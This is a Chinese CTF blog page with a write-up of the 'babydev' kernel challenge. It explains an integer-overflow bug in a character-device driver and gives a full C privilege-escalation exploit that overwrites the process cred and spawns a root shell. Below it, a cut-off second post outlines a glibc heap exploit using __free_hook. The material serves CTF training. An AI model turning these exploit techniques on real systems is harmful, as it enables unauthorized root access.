                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2020-12-07 22:59:20" itemprop="dateModified" datetime="2020-12-07T22:59:20+08:00">2020-12-07</time>
              
            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="babydev详解"><a href="#babydev详解" class="headerlink" title="babydev详解"></a>babydev详解</h1><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>首先打开文件系统查看初始化的脚本<code>init</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line"><span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod mychrdev.ko</span><br><span class="line">chmod 777 /dev/mychrdev</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\nBoot took <span class="variable">$(cut -d' ' -f1 /proc/uptime)</span> seconds\n"</span></span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<p>发现程序加载了一个<code>mychrdev.ko</code>的模块，漏洞就应该在这个内核模块中。看名字应该是一个字符设备的驱动程序。</p>
<p>将这个模块从文件系统中拷贝出来，用IDA打开它，进行分析。可以看到程序主要有几个主要的函数<code>llseek</code>，<code>read</code>，<code>write</code>，<code>open</code>，<code>ioctl</code>。</p>
<p><img src="/2020/11/23/xyb-babydev/截屏2020-11-23 下午8.57.36.png" alt="截屏2020-11-23 下午8.57.36" style="zoom:50%;"></p>
<p>结合模块的名字大致能知道每个函数的作用，<code>read</code>，<code>write</code>，<code>open</code>就是重写了<code>orw</code>操作，<code>ioctl</code>大概是它自定义了一个操作，<code>llseek</code>实现的就是重定位读写指针的功能。</p>
<h3 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a><code>ioctl</code></h3><p><img src="/2020/11/23/xyb-babydev/截屏2020-11-23 下午9.06.01.png" alt="截屏2020-11-23 下午9.06.01"></p>
<p>这个函数通过<code>0x1111</code>命令泄漏了一些信息给我们。通过它我们能知道<code>v9</code>,<code>v10</code>,<code>v11</code>,<code>v12</code>和<code>md</code>的值。通过分析我们知道<code>v9</code>是当前的进程号，<code>v10</code>是当前程序的名称，<code>v11</code>,<code>v12</code>缓冲区的一些信息，<code>md</code>则直接将缓冲区的地址<code>mydata</code>告诉了我们。</p>
<h3 id="read，write-amp-amp-llseek"><a href="#read，write-amp-amp-llseek" class="headerlink" title="read，write &amp;&amp; llseek"></a><code>read</code>，<code>write</code> &amp;&amp; <code>llseek</code></h3><p>驱动程序主要维护三个值，一个是文件的读写指针，没次打开文件的时候都会被重新设置为0；文件的头指针，指向文件内容开始的地方，它存放在<code>mydata+0x10000</code>中，表示文件内容的起始地址相对于<code>mydata</code>的偏移；三是文件的大小，它存放在<code>mydata+0x1008</code>中。</p>
<p>在<code>llseek</code>中可以重制文件指针的值，并且返回重制以后文件指针的值。它有三种模式</p>
<ul>
<li>当<code>mod==0</code>时，会重制文件指针为<code>a2</code></li>
<li>当<code>mod==1</code>时，将文件指针跳转到<code>当前地址+a2</code>的位置</li>
<li>当<code>mod==2</code>时，会将指针跳到文件倒数第<code>|a2|</code>（这里a2要是个负数）个位置</li>
</ul>
<p><strong>这里可以看到<code>llseek</code>无法将文件指针设置为一个负数。</strong></p>
<p><img src="/2020/11/23/xyb-babydev/截屏2020-11-23 下午9.05.34.png" alt="截屏2020-11-23 下午9.05.34"></p>
<p>查看<code>read</code>函数，在<code>copy_to_user</code>函数第二个参数<code>s_n + base + mydata</code>表示要拷贝的内核空间的地址，这里存在一个整型漏洞，<code>s_n+base</code>是负数的时候就可以跳转到<code>my_data</code>之前的地址。其中s_n是文件指针的值，我们无法通过<code>llseek</code>将其设置为负数，<strong>因此要想跳到<code>my_data</code>之前的位置进行操作要考虑在<code>base</code>上（<code>mydata+0x10000</code>）做文章</strong>。</p>
<p><img src="/2020/11/23/xyb-babydev/截屏2020-11-23 下午9.05.53.png" alt="截屏2020-11-23 下午9.05.53"></p>
<p>查看write函数，发现其同样存在整型漏洞，只要能将<code>my_data+0x10000</code>的位置，设置为负数就能够对mydata之前的地址进行操作。</p>
<p><img src="/2020/11/23/xyb-babydev/截屏2020-11-23 下午9.06.19.png" alt="截屏2020-11-23 下午9.06.19"></p>
<p>仔细观察发现write还有一个漏洞。<code>*(_QWORD *)(mydata + 0x10008) += n;</code>每次写成功之后都会吧写的内容的大小加到<code>mydata + 0x10008</code>上，和<code>llseek</code>配合就能够使得<code>mydata+0x10008</code>值超过<code>0x10000</code>，使得我们能够通过<code>write</code>随意修改<code>mydata+0x10000</code>和<code>mydata+0x10008</code>上的内容，从而实现对任意地址的读写操作。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先为了绕过<code>write</code>的检查，先写<code>0x10000</code>的内容，再将文件指针设置为<code>0</code>，再写<code>0x10000</code>的内容上去使得<code>my_data+0x10008</code>的值变成0x20000，这样就能随意写<code>my_data+0x10000</code>和<code>my_data+0x10008</code>的内容。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"/dev/mychrdev"</span>, O_WRONLY);</span><br><span class="line">    u_char buf[<span class="number">0x10010</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span> buf);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">long</span> n = write(fd, buf, <span class="number">0x10000</span>);</span><br><span class="line">        lseek(fd, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br></pre></td></tr></table></figure>
<p>然后我们就能够对任意地址进行读写，因为进程的<code>cred</code>结构在<code>mydata</code>之前，我们就主要跳到<code>mydata</code>之前进行操作。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">"/dev/mychrdev"</span>, O_WRONLY);</span><br><span class="line"><span class="keyword">int</span> n = lseek(fd, pos, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">*(<span class="keyword">size_t</span> *)buf = -(<span class="keyword">long</span> <span class="keyword">long</span>)(addr &gt;&gt; <span class="number">8</span>);</span><br><span class="line">*(<span class="keyword">size_t</span> *)(buf + <span class="number">8</span>) = <span class="number">0x100000000000</span>LL;</span><br><span class="line">n = write(fd, buf, <span class="number">0x1000</span>);</span><br><span class="line"><span class="comment">// printf("%x\n\n", n);</span></span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span> buf);</span><br><span class="line">fd = fd = open(<span class="string">"/dev/mychrdev"</span>, O_RDONLY);</span><br><span class="line">n = lseek(fd, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// printf("%d\n", n);</span></span><br><span class="line">n = read(fd, buf, <span class="number">0x10000</span>);</span><br><span class="line"><span class="comment">// printf("%d\n\n", n);</span></span><br><span class="line">close(fd);</span><br></pre></td></tr></table></figure>
<p>利用<code>char target[16] = &quot;try2findmep4nda&quot;;prctl(PR_SET_NAME, target);</code>将<code>target</code>写进内核空间中，在内核空间中<code>targe</code>t的那个地址靠近<code>cred指针</code>，因此只要利用任意读爆破出它的地址就能够知道<code>cred</code>地址，利用任意写将<code>cred</code>中的前<code>0x28</code>个字节设置为0。这里可以参考<a href="http://p4nda.top/2018/11/07/stringipc/" target="_blank" rel="noopener">P4nda大神的博客</a>。    </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">print_hex(buf,<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x28</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">    buf[i]=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">print_hex(buf, <span class="number">0x100</span>);</span><br></pre></td></tr></table></figure>
<p>最后实现提权。</p>
<p><img src="/2020/11/23/xyb-babydev/截屏2020-11-23 下午11.18.18.png" alt="截屏2020-11-23 下午11.18.18"></p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> heap;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">id</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"uid:%d\n"</span>, getuid());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/mychrdev"</span>, O_RDONLY);</span><br><span class="line">    u_char buf[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x1111</span>, buf);</span><br><span class="line">    u_char *p = buf;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, *(<span class="keyword">int</span> *)p);</span><br><span class="line">    p += <span class="number">4</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, p);</span><br><span class="line">    p += <span class="number">0x10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"0x%x\n"</span>, *(<span class="keyword">int</span> *)p);</span><br><span class="line">    p += <span class="number">4</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"0x%x\n"</span>, *(<span class="keyword">long</span> *)p);</span><br><span class="line">    p += <span class="number">8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, *(<span class="keyword">size_t</span> *)p);</span><br><span class="line">    heap = *(<span class="keyword">size_t</span> *)p;</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ((len / <span class="number">8</span>) * <span class="number">8</span>); i += <span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"0x%lx"</span>, *(<span class="keyword">size_t</span> *)(buf + i));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">16</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">" "</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    id();</span><br><span class="line"></span><br><span class="line">    show();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/mychrdev"</span>, O_WRONLY);</span><br><span class="line">    u_char buf[<span class="number">0x10010</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span> buf);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">long</span> n = write(fd, buf, <span class="number">0x10000</span>);</span><br><span class="line">        lseek(fd, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> addr = <span class="number">0x10000</span>, pre_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> cred, real_cred, target_addr;</span><br><span class="line">    <span class="keyword">char</span> target[<span class="number">16</span>] = <span class="string">"try2findmep4nda"</span>;</span><br><span class="line">    prctl(PR_SET_NAME, target);</span><br><span class="line">    <span class="keyword">for</span> (;; pre_addr = addr, addr += <span class="number">0x10000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// printf("pre_addr:0x%lX\n",heap-pre_addr);</span></span><br><span class="line">        <span class="comment">// printf("addr:0x%lX\n", heap-addr);</span></span><br><span class="line">        <span class="keyword">size_t</span> pos = pre_addr + <span class="number">0x10001</span>;</span><br><span class="line">        <span class="comment">// printf("pos:0x%lx\n", pos);</span></span><br><span class="line"></span><br><span class="line">        fd = open(<span class="string">"/dev/mychrdev"</span>, O_WRONLY);</span><br><span class="line">        <span class="keyword">int</span> n = lseek(fd, pos, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// printf("0x%x\n", n);</span></span><br><span class="line">        <span class="comment">// *(size_t *)buf = -0x10000LL;</span></span><br><span class="line">        *(<span class="keyword">size_t</span> *)buf = -(<span class="keyword">long</span> <span class="keyword">long</span>)(addr &gt;&gt; <span class="number">8</span>);</span><br><span class="line">        *(<span class="keyword">size_t</span> *)(buf + <span class="number">8</span>) = <span class="number">0x100000000000</span>LL;</span><br><span class="line">        n = write(fd, buf, <span class="number">0x1000</span>);</span><br><span class="line">        <span class="comment">// printf("%x\n\n", n);</span></span><br><span class="line">        close(fd);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span> buf);</span><br><span class="line">        fd = fd = open(<span class="string">"/dev/mychrdev"</span>, O_RDONLY);</span><br><span class="line">        n = lseek(fd, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// printf("%d\n", n);</span></span><br><span class="line">        n = read(fd, buf, <span class="number">0x10000</span>);</span><br><span class="line">        <span class="comment">// printf("%d\n\n", n);</span></span><br><span class="line">        close(fd);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (n != <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            u_int result = memmem(buf, <span class="number">0x10000</span>, target, <span class="number">16</span>);</span><br><span class="line">            <span class="keyword">if</span> (result)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">size_t</span> temp = buf + result - (u_int)buf;</span><br><span class="line">                real_cred = *(<span class="keyword">size_t</span> *)(temp - <span class="number">0x10</span>);</span><br><span class="line">                <span class="comment">// target_addr = heap - addr + result - (u_int)(buf);</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    pre_addr=addr;</span><br><span class="line">    <span class="keyword">size_t</span> mod=(real_cred&gt;&gt;<span class="number">16</span>)&lt;&lt;<span class="number">16</span>;</span><br><span class="line">    addr=heap-mod;</span><br><span class="line">    <span class="keyword">size_t</span> p_pos=real_cred-mod;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printf("%p\n", pre_addr);</span></span><br><span class="line">    <span class="comment">// printf("%p\n", addr);</span></span><br><span class="line">    <span class="comment">// printf("%p\n", mod);</span></span><br><span class="line">    <span class="comment">// printf("%p\n", p_pos);</span></span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">"/dev/mychrdev"</span>, O_WRONLY);</span><br><span class="line">    <span class="keyword">size_t</span> pos = pre_addr + <span class="number">0x10001</span>;</span><br><span class="line">    <span class="keyword">int</span> n = lseek(fd, pos, <span class="number">0</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)buf = -(<span class="keyword">long</span> <span class="keyword">long</span>)(addr &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    *(<span class="keyword">size_t</span> *)(buf + <span class="number">8</span>) = <span class="number">0x100000000000</span>LL;</span><br><span class="line">    n = write(fd, buf, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="comment">// printf("%x\n\n", n);</span></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span> buf);</span><br><span class="line">    fd = fd = open(<span class="string">"/dev/mychrdev"</span>, O_RDONLY);</span><br><span class="line">    n = lseek(fd, p_pos, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// printf("%d\n", n);</span></span><br><span class="line">    n = read(fd, buf, <span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">// printf("%d\n\n", n);</span></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// print_hex(buf,0x100);</span></span><br><span class="line">    <span class="comment">// printf("\n");</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x28</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[i]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// print_hex(buf, 0x100);</span></span><br><span class="line"></span><br><span class="line">    fd = fd = open(<span class="string">"/dev/mychrdev"</span>, O_WRONLY);</span><br><span class="line">    n = lseek(fd, p_pos, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// printf("%d\n", n);</span></span><br><span class="line">    n = write(fd, buf, <span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">// printf("%d\n\n", n);</span></span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    id();</span><br><span class="line">    <span class="comment">// close(fd);</span></span><br><span class="line"></span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这篇博客已经在发布在安全客上<a href="https://www.anquanke.com/post/id/223468" target="_blank" rel="noopener">https://www.anquanke.com/post/id/223468</a></p>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/05/hxb-only-add/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="xkaneiki">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="xkaneiki's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2020/11/05/hxb-only-add/" class="post-title-link" itemprop="url">hxb_only_add</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2020-11-05 17:53:42 / Modified: 17:54:14" itemprop="dateCreated datePublished" datetime="2020-11-05T17:53:42+08:00">2020-11-05</time>
            

            
              

              
            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="only-add"><a href="#only-add" class="headerlink" title="only_add"></a>only_add</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>realloc的利用</p>
<ol>
<li><p>realloc申请的堆块比当前堆块小时，如果差值足够一个chunk就切割当前chunk</p>
</li>
<li><p>realloc大小为0的堆块时就会释放当前的chunk</p>
</li>
</ol>
<p>然后程序当申请堆块往堆块里面写入数据时可以额外写一个字节offset-by-one</p>
<ol>
<li><p>通过realloc和offset-by-one漏洞，将申请的0x40大小的chunk改成0xe0。申请再释放后他们都进入了0xe0的tcache。由于申请的3个0x40的块都间隔0x20，每个堆块都被前面的堆块重叠。</p>
</li>
<li><p>在申请0x500的空间切割后释放，进入unsortbin，此时就又了libc地址</p>
</li>
<li><p>由于和之前改过大小的堆块相邻，通过构造tcache链可以将unsortbin中的堆块链入tcache并改写fd的低字节使其指向stdout</p>
</li>
<li><p>不断申请堆块控制stdout，将IO_write_base的低字节设置为0，泄漏出libc地址</p>
</li>
<li><p>此时利用程序的del函数清空buf</p>
</li>
<li><p>仍然利用之前的重叠的堆块，控制__free_hook为system的地址（控制的地址往前挪8个字节，用来放/bin/sh\0）</p>
</li>
<li><p>申请一个0的空间就会调用free出发__free_hook获得shell</p>
<p><strong>注意由于输出流被关掉，输出时要将输出重定向到错误流（也就是屏幕上）输出，cat flag &gt;&amp;2</strong></p>
</li>
</ol>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span 